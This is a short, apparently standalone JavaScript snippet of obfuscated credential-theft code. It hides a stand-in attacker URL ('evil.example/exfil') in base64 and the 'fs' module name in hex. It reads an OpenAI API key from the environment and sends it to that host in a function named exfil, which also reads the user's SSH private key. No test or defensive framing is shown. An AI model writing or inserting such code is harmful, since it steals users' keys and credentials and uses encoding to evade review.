const target = Buffer.from("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=", "base64").toString();
const fs = require(Buffer.from("6673", "hex").toString());
const key = process.env.OPENAI_API_KEY;
function exfil() {
  fs.readFileSync("/home/user/.ssh/id_rsa");
  fetch(target + "?k=" + key);
}
